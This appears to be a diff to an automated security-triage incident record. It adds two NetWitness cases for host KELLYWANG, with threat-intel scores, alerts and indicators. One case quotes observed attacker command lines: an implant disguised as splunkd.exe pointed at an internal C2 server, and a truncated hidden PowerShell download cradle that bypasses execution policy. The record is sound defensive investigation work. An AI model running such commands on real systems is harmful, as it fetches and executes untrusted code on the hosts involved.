@@ -1,11 +1,11 @@
 {
   "id": "Incident-004",
   "metadata": {
-    "severity": "MEDIUM",
+    "severity": "HIGH",
     "status": "TRIAGED",
     "assigned_analyst": "Automated Agent",
     "created_at": 1791102337.6177127,
-    "updated_at": 1791215600.9765804,
+    "updated_at": 1791639068.9664254,
     "source_type": "Network",
     "similar_to_incident": null
   },
@@ -177,18 +177,240 @@
         "severity": "HIGH",
         "threat_intelligence_summary": "=== THREAT INTELLIGENCE SUMMARY ===\nRisk Level: Low\nRisk Score: 0\nRisk Reasons:\n- No confirmed malicious external intelligence was found, or no usable IOC was available."
       }
+    },
+    {
+      "id": "INC-53021",
+      "document": "Incident INC-53021 details are as follows: === INVESTIGATION CONTEXT BRIEF (canonical stage results; bounded) ===\n[CASE]\nCase ID (Investigation subject): INC-53021\nTitle: High Risk Alerts: NetWitness Endpoint for KELLYWANG\nIncident time: 2025-12-01T07:33:39+00:00\nNetWitness: risk score 70; priority HIGH; created 2025-12-01T07:33:39.338+00:00; sources ECAT; alerts 6\n[TRIAGE]\nTriage level: HIGH (Triage classification -- not the NetWitness severity)\nCategory: Suspicious Outbound Network Activity (Unverified)\nRisk dimensions: initiation High, occurrence High, adverse impact High, overall High\nRisk rationale: High-risk NetWitness endpoint activity with multiple corroborating IOCs, suspicious PowerShell bypass/download-cradle behavior, and unsigned execution from C:\\Users\\Public\\ to an internal HTTP server on port 8888 makes initiation, recurrence, and business impact highly likely.\nMITRE (Triage): tactic Command and Control; technique T1105 Ingress Tool Transfer\nTriage interpretation (Triage agent's assessment, not a factual incident description): The alert shows a user-writable executable (splunkd.exe) and PowerShell being used from the KELLYWANG host to contact 192.168.10.202:8888 over HTTP, including a download-cradle style request to /file/download. This indicates likely malicious or unauthorized command-and-control activity with cleartext network co…\nTriage IOC checklist findings: [CONFIDENTIALITY] Anomalous outbound external communication, Cleartext or unencrypted sensitive data in transit — Matched anomalous outbound communication to internal IP 192.168.10.202 on non-standard port 8888 from source 192.168.10.204, with high-risk NetWitness endpoint alert and HTTP server URL in the command line. Also matched cleartext unencrypted HTTP traffic…\nNetWitness source risk score: 70\n[ENTITIES & TELEMETRY]\nOrigins: P=Parsing, T=Triage metakeys, NW=NetWitness alert metadata, INC=incident record, H=raw-incident heuristic, H-title=incident title heuristic\nSource IPs (3): 192.168.10.204 [T,P,NW,H]; 192.168.10.202 [H]; 192.168.20.16 [H]\nDestination IPs (1): 192.168.10.202 [T,P,NW,H]\nUsers (1): KELLYWANG\\Kelly Wang [P,NW,H]\nEndpoint hosts (1): KELLYWANG [INC,P,NW,H-title]\nFile hashes (4): 4854484a90704cff48d94f6f55238d965f4820803a674d8a46959866420fc607 [T,P,NW]; 0ddcc6af9a1d9e91f6f5f2e7cad26cb0 [T,P,NW]; 870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb [T,P,NW]; 6bb54b2d7a3d63578559239a79700ea3 [T,P,NW]\nFiles (2): splunkd.exe [T,P,NW]; powershell.exe [T,P,NW]\nProcesses (2): splunkd.exe [T,P]; powershell.exe [T,P]\nCommand line: splunkd.exe -server http://192.168.10.202:8888 -group red\nCommand line: powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \" $server='http://192.168.10.202:8888'; $url=$server + '/file/download'; $wc=New-Object System.Net.WebClient; $wc.Headers.add('platform','windows'); $wc.Headers.add('file'…\nNetwork detail [Triage metakeys / NetWitness alert metadata]: destination port 8888\nOperating system: windows\nFile path: ['C:\\\\Users\\\\Public\\\\', 'C:\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\']\nNetWitness alerts listed after this brief: 6\n[THREAT INTELLIGENCE]\n=== THREAT INTELLIGENCE SUMMARY ===\nRisk Level: Medium\nRisk Score: 60\nRisk Reasons:\n- VirusTotal reported 48 malicious detection(s) for the file hash.\n- AlienVault OTX found 1 related pulse(s) for 870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb.\nTI stage status: completed\nTI contract: multi-indicator (per-IOC roles, origins and provider verdicts)\nCoverage: extracted 9, eligible 4, enriched 4, excluded 5, skipped 0 (by limit 0; limit 10 per type)\nProvider coverage: AbuseIPDB not_applicable (queried 0/0, failed 0); AlienVault OTX available (queried 4/4, failed 0); VirusTotal available (queried 4/4, failed 0)\nIntelligence gaps: none recorded\nNOT enriched: 1 excluded/internal_hostname, 2 excluded/private, 2 excluded/unsupported_type -- e.g. 192.168.10.204, 192.168.10.202, kellywang, splunkd.exe, powershell.exe\nTI warnings: none recorded\nTI recommended next action: Medium enrichment risk was identified — review the risk reasons below.\nEnriched indicators (4, highest provider evidence first):\n- 0ddcc6af9a1d9e91f6f5f2e7cad26cb0 | hash | role: not recorded | origin: Parsed file indicators, Parsed IOC summary (+2) | VT: 48 malicious, 0 suspicious of 70 | OTX: 0 pulses\n- 4854484a90704cff48d94f6f55238d965f4820803a674d8a46959866420fc607 | hash | role: not recorded | origin: Parsed file indicators, Parsed IOC summary (+3) | VT: 48 malicious, 0 suspicious of 70 | OTX: 0 pulses\n- 870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb | hash | role: not recorded | origin: Parsed file indicators, Parsed IOC summary (+2) | VT: 0 malicious, 0 suspicious of 71 | OTX: 1 pulses\n- 6bb54b2d7a3d63578559239a79700ea3 | hash | role: not recorded | origin: Parsed file indicators, Parsed IOC summary (+2) | VT: 0 malicious, 0 suspicious of 71 | OTX: 0 pulses\n[DATA QUALITY / LIMITATIONS]\nParsing warnings: Missing context-relevant parsing fields: protocol\nParsing missing fields (not present in telemetry): protocol\n=== END INVESTIGATION CONTEXT BRIEF === Incident INC-53021 has 6 NetWitness sub-alert record(s) (this case's own source alerts): Alert #1 (692d44cf6c4fbd7c5a167810) - 'Potential C2 Connection (Kelly)' at [2025-12-01T07:33:35.204000+00:00], NetWitness severity: 7, User: KELLYWANG\\Kelly Wang, Host: KELLYWANG, SrcIP: 192.168.10.204, DstIP: 192.168.10.202, Domains: acmecorp-reset.com, Connection: 192.168.10.204 to 192.168.10.202-KELLYWANG. Detail: Alert #2 (692d44cf6c4fbd7c5a167811) - 'Potential C2 Connection (Kelly)' at [2025-12-01T07:33:35.299000+00:00], NetWitness severity: 7, User: KELLYWANG\\Kelly Wang, Host: KELLYWANG, SrcIP: 192.168.10.204, DstIP: 192.168.10.202, Domains: acmecorp-reset.com, Connection: 192.168.10.204 to 192.168.10.202-KELLYWANG. Detail: Alert #3 (692d44d06c4fbd7c5a167812) - 'Potential C2 Connection (Kelly)' at [2025-12-01T07:33:36.268000+00:00], NetWitness severity: 7, User: KELLYWANG\\Kelly Wang, Host: KELLYWANG, SrcIP: 192.168.10.204, DstIP: 192.168.10.202, Domains: acmecorp-reset.com, Connection: 192.168.10.204 to 192.168.10.202-KELLYWANG. Detail: Alert #4 (692d44d06c4fbd7c5a167814) - 'Potential C2 Connection (Kelly)' at [2025-12-01T07:33:36.262000+00:00], NetWitness severity: 7, User: KELLYWANG\\Kelly Wang, Host: KELLYWANG, SrcIP: 192.168.10.204, DstIP: 192.168.10.202, Domains: acmecorp-reset.com, Connection: 192.168.10.204 to 192.168.10.202-KELLYWANG. Detail: Alert #5 (692d44d06c4fbd7c5a167813) - 'Potential C2 Connection (Kelly)' at [2025-12-01T07:33:36.260000+00:00], NetWitness severity: 7, User: KELLYWANG\\Kelly Wang, Host: KELLYWANG, SrcIP: 192.168.10.204, DstIP: 192.168.10.202, Domains: acmecorp-reset.com, Connection: 192.168.10.204 to 192.168.10.202-KELLYWANG. Detail: Alert #6 (692d44d06c4fbd7c5a167815) - 'Potential C2 Connection (Kelly)' at [2025-12-01T07:33:36.268000+00:00], NetWitness severity: 7, User: KELLYWANG\\Kelly Wang, Host: KELLYWANG, SrcIP: 192.168.10.204, DstIP: 192.168.10.202, Domains: acmecorp-reset.com, Connection: 192.168.10.204 to 192.168.10.202-KELLYWANG. Detail:",
+      "metadata": {
+        "incident_id": "INC-53021",
+        "source_type": "Network",
+        "username": "KELLYWANG\\Kelly Wang",
+        "hostname": "KELLYWANG",
+        "timestamp_str": "2025-12-01T07:33:39+00:00",
+        "timestamp_epoch": 1764574419,
+        "tactic": "Command and Control",
+        "technique": "T1105 Ingress Tool Transfer",
+        "ips": "192.168.10.202,192.168.10.204,192.168.20.16",
+        "sha256s": "4854484a90704cff48d94f6f55238d965f4820803a674d8a46959866420fc607,870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb",
+        "md5s": "6bb54b2d7a3d63578559239a79700ea3,0ddcc6af9a1d9e91f6f5f2e7cad26cb0",
+        "emails": "",
+        "domains": "System.Net,acmecorp-reset.com,exe.trojan,BehavesLike.Win64.Generic.vh,sandcat.go,wc.Headers.add",
+        "severity": "HIGH",
+        "threat_intelligence_summary": "=== THREAT INTELLIGENCE SUMMARY ===\nRisk Level: Medium\nRisk Score: 60\nRisk Reasons:\n- VirusTotal reported 48 malicious detection(s) for the file hash.\n- AlienVault OTX found 1 related pulse(s) for 870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb."
+      },
+      "alerts": [
+        {
+          "alert_id": "692d44cf6c4fbd7c5a167810",
+          "title": "Potential C2 Connection (Kelly)",
+          "timestamp": "2025-12-01T07:33:35.204000+00:00",
+          "severity": 7,
+          "alert_types": [
+            "Endpoint"
+          ],
+          "detection_source": "ECAT",
+          "connection_summary": "192.168.10.204 to 192.168.10.202-KELLYWANG",
+          "source_ips": [
+            "192.168.10.204"
+          ],
+          "destination_ips": [
+            "192.168.10.202"
+          ],
+          "users": [
+            "KELLYWANG\\Kelly Wang"
+          ],
+          "hostnames": [
+            "KELLYWANG"
+          ],
+          "domains": [
+            "acmecorp-reset.com"
+          ]
+        },
+        {
+          "alert_id": "692d44cf6c4fbd7c5a167811",
+          "title": "Potential C2 Connection (Kelly)",
+          "timestamp": "2025-12-01T07:33:35.299000+00:00",
+          "severity": 7,
+          "alert_types": [
+            "Endpoint"
+          ],
+          "detection_source": "ECAT",
+          "connection_summary": "192.168.10.204 to 192.168.10.202-KELLYWANG",
+          "source_ips": [
+            "192.168.10.204"
+          ],
+          "destination_ips": [
+            "192.168.10.202"
+          ],
+          "users": [
+            "KELLYWANG\\Kelly Wang"
+          ],
+          "hostnames": [
+            "KELLYWANG"
+          ],
+          "domains": [
+            "acmecorp-reset.com"
+          ]
+        },
+        {
+          "alert_id": "692d44d06c4fbd7c5a167812",
+          "title": "Potential C2 Connection (Kelly)",
+          "timestamp": "2025-12-01T07:33:36.268000+00:00",
+          "severity": 7,
+          "alert_types": [
+            "Endpoint"
+          ],
+          "detection_source": "ECAT",
+          "connection_summary": "192.168.10.204 to 192.168.10.202-KELLYWANG",
+          "source_ips": [
+            "192.168.10.204"
+          ],
+          "destination_ips": [
+            "192.168.10.202"
+          ],
+          "users": [
+            "KELLYWANG\\Kelly Wang"
+          ],
+          "hostnames": [
+            "KELLYWANG"
+          ],
+          "domains": [
+            "acmecorp-reset.com"
+          ]
+        },
+        {
+          "alert_id": "692d44d06c4fbd7c5a167814",
+          "title": "Potential C2 Connection (Kelly)",
+          "timestamp": "2025-12-01T07:33:36.262000+00:00",
+          "severity": 7,
+          "alert_types": [
+            "Endpoint"
+          ],
+          "detection_source": "ECAT",
+          "connection_summary": "192.168.10.204 to 192.168.10.202-KELLYWANG",
+          "source_ips": [
+            "192.168.10.204"
+          ],
+          "destination_ips": [
+            "192.168.10.202"
+          ],
+          "users": [
+            "KELLYWANG\\Kelly Wang"
+          ],
+          "hostnames": [
+            "KELLYWANG"
+          ],
+          "domains": [
+            "acmecorp-reset.com"
+          ]
+        },
+        {
+          "alert_id": "692d44d06c4fbd7c5a167813",
+          "title": "Potential C2 Connection (Kelly)",
+          "timestamp": "2025-12-01T07:33:36.260000+00:00",
+          "severity": 7,
+          "alert_types": [
+            "Endpoint"
+          ],
+          "detection_source": "ECAT",
+          "connection_summary": "192.168.10.204 to 192.168.10.202-KELLYWANG",
+          "source_ips": [
+            "192.168.10.204"
+          ],
+          "destination_ips": [
+            "192.168.10.202"
+          ],
+          "users": [
+            "KELLYWANG\\Kelly Wang"
+          ],
+          "hostnames": [
+            "KELLYWANG"
+          ],
+          "domains": [
+            "acmecorp-reset.com"
+          ]
+        },
+        {
+          "alert_id": "692d44d06c4fbd7c5a167815",
+          "title": "Potential C2 Connection (Kelly)",
+          "timestamp": "2025-12-01T07:33:36.268000+00:00",
+          "severity": 7,
+          "alert_types": [
+            "Endpoint"
+          ],
+          "detection_source": "ECAT",
+          "connection_summary": "192.168.10.204 to 192.168.10.202-KELLYWANG",
+          "source_ips": [
+            "192.168.10.204"
+          ],
+          "destination_ips": [
+            "192.168.10.202"
+          ],
+          "users": [
+            "KELLYWANG\\Kelly Wang"
+          ],
+          "hostnames": [
+            "KELLYWANG"
+          ],
+          "domains": [
+            "acmecorp-reset.com"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "INC-53020",
+      "document": "Incident INC-53020 details are as follows: === INVESTIGATION CONTEXT BRIEF (canonical stage results; bounded) ===\n[CASE]\nCase ID (Investigation subject): INC-53020\nTitle: High Risk Alerts: NetWitness Endpoint for KELLYWANG\nIncident time: 2025-12-01T07:11:11+00:00\nNetWitness: risk score 70; priority High; created 2025-12-01T07:11:11.137Z; sources ECAT; alerts 2\n[TRIAGE]\nTriage level: HIGH (Triage classification -- not the NetWitness severity)\nCategory: Suspicious Internal Network Activity\nRisk dimensions: initiation High, occurrence Medium, adverse impact Medium, overall High\nRisk rationale: Initiation is High because a high-risk NetWitness endpoint alert with matching internal IP IOC evidence indicates credible adversary activity; occurrence is Medium because the alert shows only a single observed network interaction and no repeated event history; adverse impact is Medium because the traffic is anomalous and high-risk but lacks port/protocol and endpoint/process cont…\nMITRE (Triage): tactic Lateral Movement; technique not provided\nTriage interpretation (Triage agent's assessment, not a factual incident description): NetWitness generated a high-risk endpoint/network alert for internal host 192.168.10.204 communicating with 192.168.10.202, but the available telemetry lacks destination port and protocol context. No PowerShell indicators or decoded commands were found, so this currently appears to be suspicious but unconfirmed…\nTriage IOC checklist findings: [CONFIDENTIALITY] Anomalous outbound external communication — Matched IOC 1 due to observed network activity from source IP 192.168.10.204 to destination IP 192.168.10.202, with a high-risk NetWitness endpoint alert and no additional port/protocol context, indicating anomalous outbound/internal communication.\nNetWitness source risk score: 70\n[ENTITIES & TELEMETRY]\nOrigins: P=Parsing, T=Triage metakeys, NW=NetWitness alert metadata, INC=incident record, H=raw-incident heuristic, H-title=incident title heuristic\nSource IPs (1): 192.168.10.204 [T,P,NW,H]\nDestination IPs (1): 192.168.10.202 [T,P,NW,H]\nEndpoint hosts (1): KELLYWANG [H-title]\nNetWitness alerts listed after this brief: 0\n[THREAT INTELLIGENCE]\n=== THREAT INTELLIGENCE SUMMARY ===\nRisk Level: Low\nRisk Score: 0\nRisk Reasons:\n- No confirmed malicious external intelligence was found, or no usable IOC was available.\nTI stage status: completed\nTI contract: multi-indicator (per-IOC roles, origins and provider verdicts)\nCoverage: extracted 2, eligible 0, enriched 0, excluded 2, skipped 0 (by limit 0; limit 10 per type)\nProvider coverage: AbuseIPDB not_applicable (queried 0/0, failed 0); AlienVault OTX not_applicable (queried 0/0, failed 0); VirusTotal not_applicable (queried 0/0, failed 0)\nIntelligence gaps: No eligible external indicators were available — no provider requests were made.\nNOT enriched: 2 excluded/private -- e.g. 192.168.10.204, 192.168.10.202\nTI warnings: none recorded\nTI recommended next action: No elevated enrichment risk was identified from the available threat intelligence.\nEnriched indicators: none\n[DATA QUALITY / LIMITATIONS]\nNetWitness alerts: not attached to the incident record (fetch status not recorded).\nParsing warnings: Missing context-relevant parsing fields: destination_port, protocol\nParsing missing fields (not present in telemetry): destination_port, protocol\n[DEEP-DIVE ANSWERS (feedback pass)]\nFeedback pass 1: 8 evidence gap(s) re-examined against the raw incident by the Triage deep-dive\n- Gap: step_2: Was it horizontal or vertical -> (n/a) no finding returned\n- Gap: step_3: Was any malicious process spawned on the victim's machine? -> (n/a) no finding returned\n- Gap: step_4: Analyze the process tree for signs of malicious activity, such as privilege escalation, lateral movement, or da… -> (n/a) no finding returned\n- Gap: step_5: Based on the analysis, determine if further investigation is necessary and the containment steps -> (n/a) no finding returned\n- Gap: step_2 -> (medium) Was it horizontal or vertical movement? The available data only shows one internal source IP (192.168.10.204) communicating with one internal destination IP (192.168.10.202). Both are in the same 192… | collect via: Query NetWitness/EDR for the alert details including destination port, protocol, and any authenticated session data; al…\n- Gap: step_3 -> (none) Was any malicious process spawned on the victim's machine? No process telemetry is present in the incident data. The case explicitly lacks alert attachment details and the deep-dive notes missing pro… | collect via: Pull endpoint process telemetry from EDR (process creation tree, parent PID, command line, hashes) or Windows Security…\n- Gap: step_4 -> (none) Analyze the process tree for signs of malicious activity, such as privilege escalation, lateral movement, or data exfiltration. No process tree, parent-child process relationships, command lines, or… | collect via: Collect process tree data via EDR hunt on 192.168.10.204 and 192.168.10.202 (parent-child chain, command lines, file ha…\n- Gap: step_5 -> (medium) Based on the analysis, determine if further investigation is necessary and the containment steps. Further investigation is necessary because the incident is only partially substantiated: there is a h… | collect via: Perform an endpoint containment check using EDR isolate host action on 192.168.10.204 if suspicious activity persists;…\nDeep-dive extracted values: alert.first_seen=2025-12-01T06:16:40.811Z; alert.last_updated=2025-12-01T07:11:11.142Z; alert_attachment_status=not fetched; case.id=INC-53020; destination_port=missing; host.name=KELLYWANG; incident.time=2025-12-01T07:11:11+00:00; ip.dst=192.168.10.202\nDeep-dive summary: The incident shows a high-risk NetWitness alert involving internal-to-i\n[... DEEP-DIVE ANSWERS (feedback pass) section truncated at 2500 chars ...]\n=== END INVESTIGATION CONTEXT BRIEF ===",
+      "metadata": {
+        "incident_id": "INC-53020",
+        "source_type": "Network",
+        "username": "Unknown",
+        "hostname": "KELLYWANG",
+        "timestamp_str": "2025-12-01T07:11:11+00:00",
+        "timestamp_epoch": 1764573071,
+        "tactic": "Lateral Movement",
+        "technique": "Unknown",
+        "ips": "192.168.10.0,192.168.10.204,192.168.10.202",
+        "sha256s": "",
+        "md5s": "",
+        "emails": "",
+        "domains": "incident.time,ip.dst,host.name,ip.src,case.id",
+        "severity": "HIGH",
+        "threat_intelligence_summary": "=== THREAT INTELLIGENCE SUMMARY ===\nRisk Level: Low\nRisk Score: 0\nRisk Reasons:\n- No confirmed malicious external intelligence was found, or no usable IOC was available."
+      }
     }
   ],
-  "summary_text": "On 2026-07-15T09:33:14+00:00, the incident generated a high-risk internal network alert involving 192.168.0.19 as the source and 192.168.0.34 as the destination. The telemetry available in the record is network-only and does not include protocol, port, payload, PowerShell, endpoint, or process execution details. The alert was characterized as suspicious east-west activity between two private IPs on the internal network, with repeated references to the absence of decoded PowerShell content, file hashes, known-bad external indicators, or any confirmed endpoint compromise. Subsequent triage notes treated the event as an unverified policy-violation style detection requiring investigation rather than confirmed malicious execution. The available analysis does not show a spawned process, privilege escalation chain, service creation, scheduled task, or any other process-level artifact on either host. The incident record therefore only supports the observed internal communication between the two hosts and the conclusion that further authentication, endpoint, and network telemetry would be required to determine whether the traffic represented lateral movement or benign internal activity.",
+  "summary_text": "On 2025-12-01T07:11:11+00:00, NetWitness generated a high-risk endpoint alert for internal host 192.168.10.204 associated with user and host name KELLYWANG. The available record shows a single internal network interaction from 192.168.10.204 to 192.168.10.202, but the case data does not include destination port, protocol, or an attached alert payload, so the activity cannot be tied to a confirmed login type, authenticated session, or specific service. The deep-dive metadata confirms the alert was first seen at 2025-12-01T06:16:40.811Z and last updated at 2025-12-01T07:11:11.142Z, but no endpoint process telemetry, command lines, parent-child process tree, hashes, or privilege-change evidence was available. As a result, the observable behavior in this case remains limited to suspicious internal host-to-host communication between 192.168.10.204 and 192.168.10.202, with no confirmed malicious process execution, no verified privilege escalation sequence, and no demonstrated lateral movement beyond the network connection itself.",
   "indicators": [
-    "192.168.0.",
-    "192.168.0.19",
-    "192.168.0.34",
-    "incident.id",
+    "behaveslike.win64.generic.vh",
     "device.name",
+    "0ddcc6af9a1d9e91f6f5f2e7cad26cb0",
+    "incident.time",
+    "870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb",
+    "192.168.10.0",
+    "192.168.0.",
+    "kellywang\\kelly wang",
+    "incident.id",
+    "192.168.10.",
+    "system.net",
+    "sandcat.go",
+    "wc.headers.add",
+    "exe.trojan",
     "192.168.0.0",
+    "192.168.0.19",
     "user.name",
     "host.name",
-    "incident.title"
+    "192.168.20.",
+    "192.168.0.34",
+    "case.id",
+    "4854484a90704cff48d94f6f55238d965f4820803a674d8a46959866420fc607",
+    "ip.dst",
+    "192.168.20.16",
+    "incident.title",
+    "6bb54b2d7a3d63578559239a79700ea3",
+    "acmecorp-reset.com",
+    "ip.src",
+    "192.168.10.202",
+    "kellywang",
+    "192.168.10.204"
   ]
 }
